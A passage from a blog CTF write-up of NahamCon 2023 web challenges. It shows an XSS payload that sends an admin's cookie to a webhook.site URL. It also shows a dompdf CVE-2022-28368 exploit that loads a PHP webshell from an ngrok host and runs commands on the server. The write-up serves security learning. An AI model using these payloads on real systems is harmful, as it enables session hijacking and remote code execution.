</span></span><span class="line"><span class="cl">asdf
</span></span><span class="line"><span class="cl">	flag<span class="o">{</span>7b5b91c60796488148ddf3b227735979<span class="o">}</span>
</span></span></code></pre></div><p>Very foturnately, the flag not only survived but is very readable!
<code>flag{7b5b91c60796488148ddf3b227735979}</code></p>
<p>As a side note, we have the password for <code>admin</code> now too, and can log in.
<code>admin:T2dUL6Z#S9KH%x%i</code></p>
<p><img src="images/20230616172852.png" alt="Pasted image 20230616172852.png"></p>
<h3 id="star-wars">Star Wars</h3>
<blockquote>
<p>Author: @congon4tor#2334</p>
<p>If you love Star Wars as much as I do you need to check out this blog!</p>
</blockquote>
<hr>
<p>Firstly comes logging in. After trying and failing a few easy guesses like admin:admin, I made my own account with username <code>asdf</code>. Upon entering we are led to a blog post:</p>
<p><img src="images/20230615231203.png" alt="Pasted image 20230615231203.png"></p>
<p>We see a comment section and not much else, so of course we have to check for XSS</p>
<pre tabindex="0"><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;
</code></pre><p><img src="images/20230615231619.png" alt="Pasted image 20230615231619.png"></p>
<p>Our XSS was a hit, but also we can see notice that an admin should review our comment. This setup seems prime for a cookie hijack through XSS. I will use webhook.site to receive the cookie request.</p>
<pre tabindex="0"><code>&lt;script&gt;
document.write(``&#39;&lt;img src=&#34;https://webhook.site/538e246b-2888-428c-b201-75331cefc008?c=&#39;``+document.cookie+``&#39;&#34; /&gt;&#39;``);
&lt;/script&gt;
</code></pre><p>This XSS generates an image pointing to my webhook.site link, and adds the user&rsquo;s <code>document.cookie</code> to the end of the url. And so, when a victim views this page, the image will attempt to be loaded by visiting my webhook. The webhook will log the request information and with it, I will be able to see whatever cookies are associated with the victim&rsquo;s session.</p>
<p><img src="images/20230615230950.png" alt="Pasted image 20230615230950.png"></p>
<p>Indeed we see a cookie: <code>x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIvRmQ.20AcIM9F-Kg8q21j8Pc4mVl2aO0</code></p>
<p>By substituting our X-wing cookie for this one, we become admin. Revisiting the page, nothing has changed. After a quick directory enumeration, we can find a new page by visiting <code>/admin</code>. This is pretty guessable, although I do concede to running <code>feroxbuster</code> to point it out to me:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">feroxbuster -u http://challenge.nahamcon.com:30413/
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl"><span class="m">02</span>      GET        4l       28w      303c http://challenge.nahamcon.com:30413/admin
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span></code></pre></div><p>When visiting /admin while having the token, we can find the flag.</p>
<p><img src="images/20230615230911.png" alt="Pasted image 20230615230911.png"></p>
<p><code>flag{a538c88890d45a382e44dfd00296a99b}</code></p>
<h3 id="stickers">Stickers</h3>
<blockquote>
<p>Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website!
<strong>Find the flag file in <code>/flag.txt</code> at the root of the filesystem.</strong></p>
</blockquote>
<hr>
<p>Visiting the website, there is a form to fill out custom information. Upon submitting data, we are generated a pdf webpage:</p>
<p><img src="images/20230616151436.png" alt="Pasted image 20230616151436.png"></p>
<p>In particular I notice the url of the page corresponds to the data I submitted:</p>
<pre tabindex="0"><code>http://challenge.nahamcon.com:31182/quote.php?organisation=&amp;email=&amp;small=0&amp;medium=0&amp;large=0
</code></pre><p>I downloaded the pdf file and decided to see if I can glean some information on how it was generated:</p>
<pre tabindex="0"><code>$ exiftool quote.pdf 
ExifTool Version Number         : 12.57
File Name                       : quote.pdf
Directory                       : .
File Size                       : 2.5 kB
File Modification Date/Time     : 2023:06:16 15:15:27-04:00
File Access Date/Time           : 2023:06:16 15:15:27-04:00
File Inode Change Date/Time     : 2023:06:16 15:15:27-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Producer                        : dompdf 1.2.0 + CPDF
Create Date                     : 2023:06:16 19:14:20+00:00
Modify Date                     : 2023:06:16 19:14:20+00:00
Title                           : Quote
</code></pre><p>Immediately the producer <code>dompdf</code> stands out to me. I recognize a pretty serious vulnerability it that can lead to remote code execution <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-28368">CVE-2022-28368</a>.</p>
<p>I used <a href="https://github.com/positive-security/dompdf-rce">this poc post</a> to exploit this.</p>
<p>Using my own <code>ngrok</code> website, I direct the payload toward myself, where it can pick up the malicious php:</p>
<pre tabindex="0"><code>challenge.nahamcon.com:31182/quote.php?organisation=&lt;link rel=stylesheet href=&#39;https://91cf-50-81-86-237.ngrok-free.app/exploit.css&#39;&gt;&amp;email=&amp;small=0&amp;medium=0&amp;large=0
</code></pre><p>In the exploit_font.php, I used a simple webshell one-liner:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cat exploit_font.php 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">� dum1�cmap
</span></span><span class="line"><span class="cl">           <span class="sb">`</span>�,glyf5sc��head�Q6�6hhea��<span class="o">(</span><span class="nv">$hmtxD</span>
</span></span><span class="line"><span class="cl">loca
</span></span><span class="line"><span class="cl">Tmaxp<span class="se">\ </span>nameD�<span class="p">|</span>8dum2�
</span></span><span class="line"><span class="cl">                     -��-����
</span></span><span class="line"><span class="cl">:83#5:08��_&lt;�
</span></span><span class="line"><span class="cl">             @�8�<span class="p">&amp;</span>۽
</span></span><span class="line"><span class="cl">:8L��
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">:D
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">6</span>                               s
</span></span><span class="line"><span class="cl">&lt;?php <span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])){</span> <span class="nb">echo</span> <span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="p">;</span> <span class="nv">$cmd</span> <span class="o">=</span> <span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> system<span class="o">(</span><span class="nv">$cmd</span><span class="o">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">;</span> die<span class="p">;</span> <span class="o">}</span>?&gt;
</span></span></code></pre></div><p>The unreadable junk above seems to be related to the file being intended as a font style, so it was left unchanged.</p>
<p>After the request is sent, I see two GET requests on my server, knowing that it was successfully retrieved:</p>
<pre tabindex="0"><code>HTTP Requests                                                                                                       
-------------                                                                                                       
                                                                                                                    
GET /exploit_font.php          200 OK                                                                               
GET /exploit.css               200 OK 
</code></pre><p>Now we need to determine the new name of the malicious php downloaded. While not thoroughly explained in the POC github, it appears that the name is based on the <code>md5sum</code> of the download link, in this case my ngrok link:</p>
<pre tabindex="0"><code>$ echo -ne &#34;https://91cf-50-81-86-237.ngrok-free.app/exploit_font.php&#34; | md5sum
88045a0e7631a2540434bb8c27d7d483  -
</code></pre><p>Now we visit the downloaded link under the format <code>/dompdf/lib/fonts/&lt;font-family&gt;_&lt;style&gt;_&lt;md5(url)&gt;.php</code></p>
<pre tabindex="0"><code>challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=id
</code></pre><pre tabindex="0"><code>� dum1�cmap`�,glyf5sc��head�Q6�6hhea��($hmtxD Lloca Tmaxp\ nameD�|8dum2� -��-���� :83#5:08��_&lt;�@�8�&amp;۽ :8L�� :D 6    s

uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre><p>We do indeed see that it works! We were told the flag is located in root of the filesystem:</p>
<pre tabindex="0"><code>challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=cat /flag.txt
</code></pre><p><code>flag{a4d52beabcfdeb6ba79fc08709bb5508}</code></p>

	    </div>
            <div class="page-content">
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/spencerja" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
<a href="https://app.hackthebox.com/profile/1202496" target="_blank" rel="noopener noreferrer me"
    title="Hackthebox">
    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
    <g>
        <path
            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
        </path>
    </g>
</svg>
</a>
<a href="https://tryhackme.com/p/spencerj" target="_blank" rel="noopener noreferrer me"
    title="Tryhackme">
    <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
</svg>
</a>
<a href="https://ctftime.org/team/217710" target="_blank" rel="noopener noreferrer me"
    title="Ctftime">
    <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
    preserveAspectRatio="xMidYMid meet">
    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
    </g>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2023 Spencer J.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    




    
    
        
    

    
    
        
    



    
    <script src="https://spencerja.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
